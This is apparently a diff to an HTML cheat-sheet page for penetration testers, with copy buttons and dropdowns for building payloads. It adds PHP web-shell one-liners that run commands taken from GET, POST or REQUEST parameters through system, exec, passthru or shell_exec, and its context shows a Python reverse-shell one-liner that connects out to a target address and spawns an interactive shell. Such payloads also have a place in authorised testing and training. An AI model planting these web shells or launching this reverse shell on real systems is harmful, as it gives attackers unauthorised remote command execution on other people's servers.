@@ -122,10 +122,38 @@
   
     <h3>Web Shell.</h3>
     <h4>PHP.</h4>
+    <p id="command11">$<span id="commandText11">&lt;?php system($_GET['0']);?&gt;</span><button id="copyButton11">Copy</button></p>
+    <p>
+      Function: 
+      <select>
+        <option value="wordlist1">system</option>
+        <option value="wordlist2">exec</option>
+        <option value="wordlist3">passthru</option>
+        <option value="wordlist2">shell_exec</option>
+        </select>
+      Method: 
+      <select>
+        <option value="method1">GET</option>
+        <option value="method2">POST</option>
+        <option value="method3">REQUEST</option>
+      </select>
+      Argument: 
+      <select>
+        <option value="argument1">0</option>
+        <option value="argument2">cmd</option>
+      </select>
+      <button type="button" id="updateButton2">Reload</button>
+    </p>
+    <p>Backticks</p>
     <p id="command11">$<span id="commandText11">&lt;?=`$_GET[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
-    <p id="command11">$<span id="commandText11">&lt;?=`$_POST[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
-    <p id="command11">$<span id="commandText11">&lt;?=`$_REQUEST[0]`?&gt;</span><button id="copyButton11">Copy</button></p>
-
+    <p>
+      <select>
+        <option value="wordlist1">GET</option>
+        <option value="wordlist2">POST</option>
+        <option value="wordlist3">REQUEST</option>
+      </select>
+      <button type="button" id="updateButton2">Reload</button>
+    </p>
     <h3>Reverse Shell.</h3>
     <h4>python3</h4>
     <p id="command12">$<span id="commandText12">python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$target_ip",$target_port));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'</span><button id="copyButton12">Copy</button> <button id="encodeButton">URL encode</button></p>
